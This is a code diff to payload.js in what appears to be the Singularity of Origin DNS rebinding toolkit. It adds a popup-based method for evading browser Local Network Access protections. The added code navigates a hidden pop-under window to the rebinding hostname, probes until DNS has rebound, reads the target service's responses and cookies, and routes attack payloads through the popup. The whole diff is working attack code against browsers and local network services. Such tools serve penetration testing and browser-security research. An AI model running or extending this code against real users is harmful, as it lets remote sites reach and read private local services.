@@ -1,6 +1,11 @@
 // Wrap `fetch()` API, so we can invoke it:
-// from the attack iframe (fetch attack method)
-// or from the child iframe of the attack iframe (iframe attack method)
+// from the attack iframe (fetch attack method),
+// from the child iframe of the attack iframe (iframe attack method),
+// or from the popup window of the attack iframe (popup attack method).
+// In the popup method, sooFetch is rebound to the popup's fetch() once the
+// popup has navigated (top-level, hence exempt from Local Network Access
+// restrictions) to the rebound target service, so subsequent requests are
+// issued from a document committed from the local/loopback address space.
 let sooFetch = function (resource, options) {
     return fetch(resource, options)
 };
@@ -14,6 +19,16 @@ const Rebinder = () => {
     let rebindingDoneFn = null;
 
     let timer = null;
+    let popupWin = null;
+    let popupName = 'soo-popup';
+    let popupManagerMode = false;
+    let popupTimer = null;
+    let popupPollAttempts = 0;
+    let popupNavigating = false;
+    let popupRetryCount = 0;
+    let popupFetchPending = 0;
+    let popupCloseRequested = false;
+    let rebindingStrategy = null;
 
     let payload = null;
     let interval = 60000;
@@ -47,6 +62,8 @@ const Rebinder = () => {
                     break;
                 case 'stop':
                     clearInterval(timer);
+                    clearTimeout(timer);
+                    clearInterval(popupTimer);
                     if (rebindingSuccess === false) {
                         rebindingStatusEl.innerText = `DNS rebinding failed!`;
                     }
@@ -69,7 +86,23 @@ const Rebinder = () => {
                         return cw.fetch(resource, options)
                     }
                     document.getElementById('childFrame').onload = onChildFrameLoad;
-                    timer = setInterval(function () { document.getElementById('childFrame').src = `${window.origin}`; }, interval);           
+                    timer = setInterval(function () { document.getElementById('childFrame').src = `${window.origin}`; }, interval);
+                    break;
+                case 'startPopup': // popup (top-level navigation) attack method, LNA evasion
+                    console.log('payload.js: popup attack method');
+                    startPopupAttack(e.data.param);
+                    break;
+                case 'popupNavigationFailed':
+                    // Manager could not navigate its placeholder popup
+                    // (closed by the user, or never opened). Fall back to
+                    // asking for a click in this frame, which opens a popup
+                    // owned by this frame.
+                    clearInterval(popupTimer);
+                    popupManagerMode = false;
+                    popupWin = null;
+                    rebindingStatusEl.innerText = 'Popup blocked: click the button below to allow the popup attack.';
+                    showPopupOpenButton();
+                    break;
             }
         });
     };
@@ -90,6 +123,374 @@ const Rebinder = () => {
         }
     }
     
+    // Popup method: LNA restrictions apply to fetch() and subframe (iframe)
+    // navigations, but not to main-frame (top-level) navigations.
+    //
+    // Credit: this attack method is based on the Local Network Access
+    // bypass via a new window / top-level navigation with DNS rebinding
+    // reported in the Chromium issue tracker:
+    //   https://issues.chromium.org/issues/475274565
+    // See also WICG Local Network Access issue #48 on main-frame
+    // navigations: https://github.com/WICG/local-network-access/issues/48
+    //
+    // The popup must be navigated to this frame's own origin (the DNS
+    // rebinding hostname on the target port), NOT to a "localhost" literal:
+    // a localhost popup would be cross-origin and its document/fetch would
+    // be inaccessible to us. Once the rebinding hostname resolves to the
+    // target, the popup navigation loads the target service while keeping
+    // our origin (scheme/host/port are unchanged), and the popup document
+    // is committed from the local/loopback address space, so fetch() calls
+    // issued from the popup's realm are not blocked by LNA.
+    function startPopupAttack(param) {
+        // param is normally { popupName, placeholderOpened } from the
+        // manager; tolerate a bare name string for backwards compatibility.
+        let placeholderOpened = false;
+        if (typeof param === 'string' && param) {
+            popupName = param;
+        } else if (param) {
+            if (param.popupName) {
+                popupName = param.popupName;
+            }
+            placeholderOpened = param.placeholderOpened === true;
+        }
+        // Fast path: try to retrieve the manager's placeholder popup by
+        // name. This may succeed in some browsers, but do not rely on it:
+        // while the popup is still about:blank it belongs to the manager's
+        // origin, and browsers may refuse to hand a handle for a
+        // cross-origin named window to this (cross-origin) attack frame.
+        popupWin = window.open('', popupName);
+        if (popupWin && !popupWin.closed) {
+            console.log(`payload.js: reclaimed popup window '${popupName}'`);
+            startPopupAfterOpen();
+            return;
+        }
+        popupWin = null;
+        if (placeholderOpened) {
+            // Manager-mediated mode: the manager kept its own, perfectly
+            // valid handle to the placeholder it opened on the user's
+            // click. We cannot obtain that handle here (yet), but we don't
+            // need it to navigate the popup: setting location on a window
+            // is allowed cross-origin, so we probe for the rebinding from
+            // here and simply ask the manager (via postMessage) to perform
+            // the popup navigation when the time comes. After that
+            // navigation the popup is on *our* origin (the rebinding
+            // hostname), and we can reclaim its handle by name and read it.
+            // The attack therefore starts automatically, with no second
+            // click, even though this frame never had user activation.
+            popupManagerMode = true;
+            console.log(`payload.js: using manager placeholder popup '${popupName}' (manager-mediated navigation)`);
+            startPopupAfterOpen();
+            return;
+        }
+        // No placeholder was pre-opened (e.g. attack started without a
+        // gesture, or via scan/autoattack) and creating one from here was
+        // blocked. Offer a click inside this frame instead: a real click
+        // here carries activation in *this* document.
+        console.log('payload.js: popup blocked, waiting for user click');
+        rebindingStatusEl.innerText = 'Popup blocked: click the button below to allow the popup attack.';
+        window.parent.postMessage({ status: 'popupBlocked' }, '*');
+        showPopupOpenButton();
+    }
+
+    function showPopupOpenButton() {
+        if (document.getElementById('popupOpenButton')) {
+            return;
+        }
+        let b = document.createElement('button');
+        b.setAttribute('id', 'popupOpenButton');
+        b.innerText = 'Open popup for DNS rebinding attack (LNA bypass)';
+        b.onclick = function () {
+            popupWin = window.open('about:blank', popupName, popupWindowFeatures());
+            if (popupWin) {
+                decorateSingularityPopup(popupWin);
+                sinkPopup(popupWin);
+                popupManagerMode = false;
+                b.remove();
+                startPopupAfterOpen();
+            }
+        };
+        document.body.appendChild(b);
+    }
+
+    // Entry point once we have (or the manager has) a popup window.
+    //
+    // For most strategies ('fs', 'rr', 'rd') we probe with fetch() and only
+    // navigate the popup once the rebinding is detected. 'ma' (multiple
+    // answers) is different: every DNS answer contains both the attacker
+    // and target addresses, and rebinding only completes after a request
+    // to the attacker (more than 3s into the session) trips Singularity's
+    // iptables handler, after which DNS answers become target-only. There
+    // is no clean fetch() oracle for that -- a failed fetch can mean LNA,
+    // a firewall RST, or plain address selection -- so for 'ma' the popup
+    // navigation itself is the probe: navigate, inspect what committed,
+    // and navigate again until the target commits.
+    function startPopupAfterOpen() {
+        popupRetryCount = 0;
+        if (rebindingStrategy === 'ma') {
+            console.log('payload.js: popup + multiple-answers strategy: using navigation-driven probe');
+            rebindingStatusEl.innerText = 'Popup opened. Repeatedly navigating popup until it lands on the target (multiple answers)...';
+            navigatePopupToTarget();
+        } else {
+            beginPopupProbe();
+        }
+    }
+
+    // Schedule another popup navigation (multiple-answers loop). The delay
+    // is capped at 1s for 'ma', matching Singularity's guidance for that
+    // strategy: retries need to keep hitting the attacker to trip the
+    // firewall handler, and to catch the browser falling back to the
+    // target address promptly once DNS answers become target-only.
+    function schedulePopupRenavigation(reason) {
+        clearInterval(popupTimer);
+        popupTimer = null;
+        popupNavigating = false;
+        popupRetryCount += 1;
+        if (popupRetryCount > 30) {
+            console.log(`payload.js: popup navigation loop giving up after 30 retries (${reason})`);
+            rebindingStatusEl.innerText = 'DNS rebinding failed after repeated popup navigations!';
+            window.parent.postMessage({ status: 'error' }, '*');
+            return;
+        }
+        const delay = Math.min(interval, 1000);
+        console.log(`payload.js: popup will navigate again in ${delay}ms (${reason}, retry ${popupRetryCount})`);
+        rebindingStatusEl.innerText = `Popup did not land on the target (${reason}). Retrying navigation...`;
+        clearInterval(timer);
+        timer = setTimeout(navigatePopupToTarget, delay);
+    }
+
+    // Poll with this frame's own fetch() until DNS has rebound.
+    // Before rebinding we get the Singularity HTTP response; after
+    // rebinding, browsers enforcing LNA reject the fetch with a TypeError
+    // (public document -> local/loopback destination). That rejection is
+    // our signal to navigate the popup. On browsers without LNA, the fetch
+    // simply succeeds against the target (no Singularity header).
+    function beginPopupProbe() {
+        popupNavigating = false;
+        rebindingStatusEl.innerText = 'Popup opened. Waiting for DNS rebinding before navigating popup...';
+        timer = setInterval(probePopupRebinding, interval);
+        probePopupRebinding();
+    }
+
+    function probePopupRebinding() {
+        if (popupNavigating) {
+            return; // a probe fetch already triggered the popup navigation
+        }
+        if (!popupManagerMode && (!popupWin || popupWin.closed)) {
+            clearInterval(timer);
+            rebindingStatusEl.innerText = 'Popup was closed. DNS rebinding aborted.';
+            return;
+        }
+        fetch(url, { credentials: 'omit' })
+            .then(function (r) {
+                if (r.headers.get('X-Singularity-Of-Origin') === 't') {
+                    console.log('payload.js: popup probe: still resolving to Singularity, waiting...');
+                    return;
+                }
+                console.log('payload.js: popup probe: fetch reached non-Singularity host, navigating popup');
+                navigatePopupToTarget();
+            })
+            .catch(function (e) {
+                console.log('payload.js: popup probe: fetch failed (' + e + '), assuming DNS rebound, navigating popup');
+                navigatePopupToTarget();
+            });
+    }
+
+    function navigatePopupToTarget() {
+        if (popupNavigating) {
+            return;
+        }
+        popupNavigating = true;
+        clearInterval(timer);
+        timer = null;
+        popupPollAttempts = 0;
+        const targetUrl = new URL(url, window.location.href).href;
+        rebindingStatusEl.innerText = `Navigating popup to ${targetUrl} (top-level navigation)...`;
+        if (popupManagerMode) {
+            // Ask the manager to navigate the placeholder it owns. Setting
+            // a window's location is allowed cross-origin, and the manager
+            // performs it with its own handle -- no popup is created here,
+            // so no user activation is needed in this frame.
+            console.log('payload.js: asking manager to navigate its placeholder popup');
+            window.parent.postMessage({ status: 'navigatePopup', url: targetUrl }, '*');
+        } else {
+            try {
+                popupWin.location.href = targetUrl;
+            } catch (e) {
+                console.log('payload.js: could not navigate popup: ' + e);
+            }
+        }
+        clearInterval(popupTimer);
+        popupTimer = setInterval(checkPopupNavigation, 250);
+    }
+
+    function checkPopupNavigation() {
+        popupPollAttempts += 1;
+        if (!popupWin) {
+            // Manager-mediated mode: (re)acquire the popup handle by name.
+            // Before the manager's navigation this may keep returning null
+            // (popup is still on the manager's origin); once the popup has
+            // navigated to the rebinding hostname it is same-origin with
+            // this frame and its handle/document become accessible.
+            popupWin = window.open('', popupName);
+            if (!popupWin) {
+                if (popupPollAttempts > 120) { // ~30s
+                    clearInterval(popupTimer);
+                    console.log('payload.js: could not acquire popup handle after navigation');
+                    rebindingStatusEl.innerText = 'Could not acquire the popup window after navigation.';
+                    window.parent.postMessage({ status: 'error' }, '*');
+                }
+                return;
+            }
+            console.log(`payload.js: acquired popup handle '${popupName}' after navigation`);
+        }
+        if (popupWin.closed) {
+            clearInterval(popupTimer);
+            rebindingStatusEl.innerText = 'Popup was closed. DNS rebinding failed!';
+            window.parent.postMessage({ status: 'error' }, '*');
+            return;
+        }
+        try {
+            const doc = popupWin.document;
+            if (!doc || popupWin.location.href === 'about:blank') {
+                return;
+            }
+            if (doc.readyState !== 'complete') {
+                return;
+            }
+            const html = doc.documentElement ? doc.documentElement.outerHTML : '';
+            const text = doc.body ? doc.body.innerText : '';
+            const onSingularity = (typeof indextoken !== 'undefined' && indextoken && html.includes(indextoken)) ||
+                html.includes('Singularity of Origin');
+            if (onSingularity) {
+                // Popup landed on the attacker server: DNS had not
+                // (fully) rebound yet.
+                clearInterval(popupTimer);
+                popupTimer = null;
+                if (rebindingStrategy === 'ma') {
+                    // With multiple answers this is expected, and the hit
+                    // on the attacker is itself useful (it can trip the
+                    // firewall handler). Navigate again.
+                    console.log('payload.js: popup landed on Singularity (multiple answers), navigating again');
+                    schedulePopupRenavigation('landed on Singularity');
+                } else {
+                    console.log('payload.js: popup landed on Singularity, resuming probe');
+                    beginPopupProbe();
+                }
+                return;
+            }
+            if (!html) {
+                if (popupPollAttempts < 40) {
+                    return; // navigation may still be committing an error/empty page
+                }
+                if (rebindingStrategy === 'ma') {
+                    schedulePopupRenavigation('empty popup document');
+                    return;
+                }
+            }
+            // Popup committed a document from the target service, under
+            // our origin. Rebind sooFetch into the popup's realm so all
+            // registered payloads run from the local address space.
+            clearInterval(popupTimer);
+            popupTimer = null;
+            // Count fetches issued from the popup so we can close it once
+            // rebinding has succeeded and the payload's requests have
+            // settled. Closing earlier would abort those requests.
+            sooFetch = (resource, options) => {
+                const pending = popupWin.fetch(resource, options);
+                popupFetchPending += 1;
+                const settled = () => {
+                    popupFetchPending -= 1;
+                    // Defer the check so a payload .then that starts the
+                    // next request runs before we decide the window is idle.
+                    queueMicrotask(closePopupIfIdle);
+                };
+                pending.then(settled, settled);
+                return pending;
+            };
+            rebindingStatusEl.innerText = 'Popup navigated to target. Fetching via popup window...';
+            let p = sooFetch(url, { credentials: 'omit' });
+            p.then(
+                function (r) {
+                    // With multiple answers, even a popup that committed
+                    // the target can have a later fetch routed back to the
+                    // attacker address. Treat that as another navigation
+                    // retry rather than a (silent) failed rebinding.
+                    if (rebindingStrategy === 'ma' &&
+                        r.headers.get('X-Singularity-Of-Origin') === 't') {
+                        console.log('payload.js: popup fetch landed on Singularity (multiple answers), navigating again');
+                        schedulePopupRenavigation('popup fetch landed on Singularity');
+                        return;
+                    }
+                    run(p);
+                },
+                function (fetchError) { popupNavigationFallback(text || html, fetchError); }
+            );
+        } catch (e) {
+            // Cross-Origin-Opener-Policy on the target, a redirect to a
+            // different origin (e.g. a localhost literal), or a browser
+            // error page makes the popup document inaccessible.
+            if (popupPollAttempts > 40) {
+                clearInterval(popupTimer);
+                popupTimer = null;
+                if (rebindingStrategy === 'ma') {
+                    // With multiple answers, an error page most likely
+                    // means the navigation hit the attacker address while
+                    // Singularity's iptables RST rule was active (or the
+                    // browser pinned the attacker address). That state is
+                    // transient (~5s rule, ~10s DNS TTL), so wait and
+                    // navigate again instead of giving up.
+                    console.log('payload.js: popup document inaccessible (multiple answers), will navigate again: ' + e);
+                    schedulePopupRenavigation('popup error page');
+                } else {
+                    console.log('payload.js: popup document inaccessible (COOP/redirect/error page?): ' + e);
+                    rebindingStatusEl.innerText = 'Popup navigation succeeded but its document is inaccessible (COOP, redirect to another origin, or error page).';
+                    window.parent.postMessage({ status: 'error' }, '*');
+                }
+            }
+        }
+    }
+
+    // Navigation-only fallback: if fetch() from the popup realm is still
+    // blocked in some browser, at least deliver what the top-level
+    // navigation already read (equivalent to a Simple Fetch Get of '/').
+    function popupNavigationFallback(navigationBody, fetchError) {
+        console.log('payload.js: popup fetch failed (' + fetchError + '), falling back to navigation body');
+        body = navigationBody;
+        headers = new Headers();
+        try { cookie = popupWin.document.cookie; } catch (e) { cookie = ''; }
+        rebindingSuccess = true;
+        rebindingStatusEl.innerText = 'DNS rebinding successful (navigation-only, popup fetch blocked)!';
+        window.parent.postMessage({
+            status: 'success',
+            response: body,
+            httpStatus: 0
+        }, '*');
+        rebindingDoneFn(payload, headers, cookie, body, wsproxyport);
+        requestPopupClose();
+    }
+
+    // Ask the manager (which opened the placeholder) to close it, and try
+    // locally too for the fallback button path where this frame owns it.
+    // A page can only reliably close a window it opened itself.
+    function requestPopupClose() {
+        popupCloseRequested = true;
+        closePopupIfIdle();
+    }
+
+    function closePopupIfIdle() {
+        if (!popupCloseRequested || popupFetchPending > 0) {
+            return;
+        }
+        popupCloseRequested = false;
+        console.log('payload.js: DNS rebinding finished, closing popup');
+        try {
+            if (popupWin && !popupWin.closed) {
+                popupWin.close();
+            }
+        } catch (e) { /* the manager closes the window it opened */ }
+        window.parent.postMessage({ status: 'closePopup' }, '*');
+    }
+
     function injectScript(frame) {
         let doc = frame.contentDocument || frame.contentWindow.document;
         let script = document.createElement("script");
@@ -101,6 +502,15 @@ const Rebinder = () => {
     function init(myUrl, myRebindingDoneFn) {
         url = myUrl;
         rebindingDoneFn = myRebindingDoneFn;
+        // The rebinding strategy is encoded in this frame's hostname:
+        // s-<attacker>.<target>-<session>-<strategy>-e.<domain>
+        try {
+            const parts = window.location.hostname.match(/(?:[^-]|--)+/g);
+            if (parts && parts[3]) {
+                rebindingStrategy = parts[3];
+            }
+        } catch (e) { /* strategy stays null; popup uses the fetch probe */ }
+        console.log(`payload.js: rebinding strategy: ${rebindingStrategy}`);
         initCommsWithParentFrame();
         window.parent.postMessage({
             status: 'start'
@@ -158,6 +568,9 @@ const Rebinder = () => {
                 rebindingSuccess = true;
                 rebindingStatusEl.innerText = `DNS rebinding successful! (HTTP ${responseData.status})`;
                 rebindingDoneFn(payload, headers, cookie, body, wsproxyport);
+                if (popupWin) {
+                    requestPopupClose();
+                }
             })
             .catch(function (error) {
                 if (error instanceof TypeError) { // We cannot establish an HTTP connection
@@ -577,6 +990,55 @@ function httpHeaderstoText(headers) {
         out = (`${out}\n${pair[0]}: ${pair[1]}`);
     };
     return out;
+}
+
+// Same placeholder styling and pop-under behavior as manager.js, for the
+// fallback button in this frame (the manager's helpers are not in scope here).
+function popupWindowFeatures() {
+    const width = 380;
+    const height = 230;
+    const left = Math.max(0, (window.screen.availWidth || 0) - width - 24);
+    const top = Math.max(0, (window.screen.availHeight || 0) - height - 48);
+    return `width=${width},height=${height},left=${left},top=${top},` +
+        'menubar=no,toolbar=no,location=no,status=no,resizable=yes,scrollbars=no';
+}
+
+function decorateSingularityPopup(popup) {
+    const html = `<!doctype html>
+<html lang="en"><head><meta charset="utf-8">
+<title>Singularity of Origin</title>
+<style>
+  html, body { margin: 0; height: 100%; }
+  body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; color: #212529; background: #fff; }
+  .jumbotron { padding: 1.1rem 1.25rem; margin: 0; background-color: #e9ecef; }
+  h1 { font-size: 1.35rem; font-weight: 400; line-height: 1.2; margin: 0 0 .35rem; }
+  .lead { margin: 0; font-size: 1rem; font-weight: 300; }
+  .note { margin: 0; padding: .9rem 1.25rem; font-size: .875rem; color: #6c757d; }
+</style></head>
+<body>
+  <div class="jumbotron">
+    <h1>Singularity of Origin</h1>
+    <p class="lead">DNS rebinding in progress.</p>
+  </div>
+  <p class="note">This window loads the target once DNS has rebound. Leave it in the background and don’t close it.</p>
+  <script>try { window.blur(); if (window.opener && !window.opener.closed) window.opener.focus(); } catch (e) {}</script>
+</body></html>`;
+    try {
+        const doc = popup.document;
+        doc.open();
+        doc.write(html);
+        doc.close();
+    } catch (e) { /* placeholder content is best-effort */ }
+}
+
+function sinkPopup(popup) {
+    const refocus = () => {
+        try { if (popup && !popup.closed) popup.blur(); } catch (e) {}
+        try { window.top.focus(); } catch (e) {}
+        try { window.focus(); } catch (e) {}
+    };
+    refocus();
+    setTimeout(refocus, 0);
 }
 
 let Registry = {};
